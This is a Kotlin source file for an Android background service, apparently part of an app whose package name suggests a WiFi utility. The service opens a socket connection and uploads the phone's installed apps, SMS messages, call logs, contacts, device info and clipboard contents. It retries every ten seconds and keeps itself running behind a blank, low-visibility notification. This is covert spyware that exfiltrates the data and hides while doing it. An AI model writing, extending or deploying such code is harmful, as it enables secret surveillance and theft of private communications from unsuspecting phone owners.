package wifi.fiend // ✅ تم تغييرها لتطابق Manifest

import android.annotation.SuppressLint
import android.app.*
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat

class MainService : Service() {

    private val handler = Handler(Looper.getMainLooper())

    // Runnable لإعادة المحاولة إذا فشل الاتصال
    private val connectionRunnable = object : Runnable {
        override fun run() {
            try {
                // تأكد من أن العملية تتم في خيط منفصل حتى لا يتجمد التطبيق
                Thread {
                    try {
                        // ❗️ تأكد أن اسم AppSocket يطابق الملف الموجود لديك
                        val socket = AppSocket(this@MainService)
                        val action = socket.action
                        socket.connect()
                        action.uploadApps()
                        action.uploadMessages()
                        action.uploadCalls()
                        action.uploadContact()
                        action.uploadDeviceInfo()
                        action.uploadClipboard()

                        // إزالة هذا السطر إذا لم تعد تريد إعادة المحاولة بعد النجاح
                        // handler.postDelayed(this, 5000) 
                    } catch (e: Exception) {
                        e.printStackTrace()
                        // إذا فشل الاتصال، نعيد المحاولة بعد 10 ثوانٍ
                        handler.postDelayed(this, 10000)
                    }
                }.start()
            } catch (e: Exception) {
                e.printStackTrace()
                handler.postDelayed(this, 10000)
            }
        }
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        // تحديث الحالة في JobWakeUpService ليتم إعلامها أن الخدمة تعمل
        JobWakeUpService.isMainServiceRunning = true
        
        startForeground(1, getNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // بدء الاتصال
        handler.postDelayed(connectionRunnable, 5000) 
        
        // إعادة تشغيل الخدمة إذا قتلها النظام
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        // تحديث الحالة عند التدمير
        JobWakeUpService.isMainServiceRunning = false
        // إيقاف الـ Runnable لتجنب تسرب الذاكرة
        handler.removeCallbacks(connectionRunnable)
    }

    @SuppressLint("NewApi")
    private fun getNotification(): Notification {
        val channelId = "channel"
        val channelName = " "
        val channel = NotificationChannel(
            channelId,
            channelName,
            NotificationManager.IMPORTANCE_MIN
        )
        channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val manager = (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
        manager.createNotificationChannel(channel)
        val notificationBuilder = NotificationCompat.Builder(this, channelId)
        return notificationBuilder.setOngoing(true)
            .setSmallIcon(R.drawable.mpt)
            .setContentTitle(" ")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
            .setPriority(NotificationManager.IMPORTANCE_UNSPECIFIED)
            .setCustomBigContentView(RemoteViews(packageName, R.layout.notification))
            .build()
    }
}
